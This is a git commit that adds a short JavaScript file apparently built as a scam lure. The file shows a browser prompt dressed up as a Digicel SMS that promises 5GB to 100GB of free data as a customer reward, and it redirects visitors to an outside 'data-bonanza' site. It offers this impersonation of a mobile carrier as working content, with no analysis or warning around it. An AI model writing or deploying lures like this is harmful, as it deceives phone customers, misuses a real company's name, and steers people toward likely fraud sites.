4c0782f446a45badb88da1668c6ef2bbeb31b874
infofest <ukpono82@gmail.com>
2025-03-12 18:33:51 -0700

    Create activation-digicel-freedata.js

---
+++ activation-digicel-freedata.js
@@ -0,0 +1,5 @@
+var password = 'Free Data'
+password=prompt('DIGICEL SMS: Dear Customer, Kindly Check if Your Digicel Sim Card is Qualify To Receive From 5GB To 100GB Data, Old Customers Reward, Press Free Data To Check Now ','Free Data');
+if (password != 'Free Data') {
+location.href='https://www.data-bonanza.xyz/digicel-freedata';
+}
